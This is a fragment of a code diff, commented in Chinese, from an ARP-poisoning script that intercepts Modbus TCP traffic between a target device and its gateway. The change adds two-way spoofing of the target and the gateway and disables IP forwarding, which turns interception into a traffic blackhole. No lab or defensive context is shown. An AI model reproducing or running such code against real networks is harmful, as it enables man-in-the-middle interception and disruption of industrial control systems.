@@ -95,7 +95,7 @@ def main():
     print(f"[INFO] 攻击者 MAC: {attacker_mac}")
 
     # 启用 IP 转发（系统会自动处理未被拦截的包）
-    enable_ip_forwarding()
+    #enable_ip_forwarding()
 
     # 启动一个线程捕获目标设备和网关之间的 Modbus TCP 流量
     capture_thread = threading.Thread(
@@ -109,6 +109,7 @@ def main():
         while True:
             # 持续发送伪造的 ARP 包
             send_arp_poison(target_ip, target_mac, gateway_ip, attacker_mac, iface)
+            send_arp_poison(gateway_ip, gateway_mac, target_ip, attacker_mac, iface)
             time.sleep(2)  # 每隔 2 秒发送一次
 
     except KeyboardInterrupt:
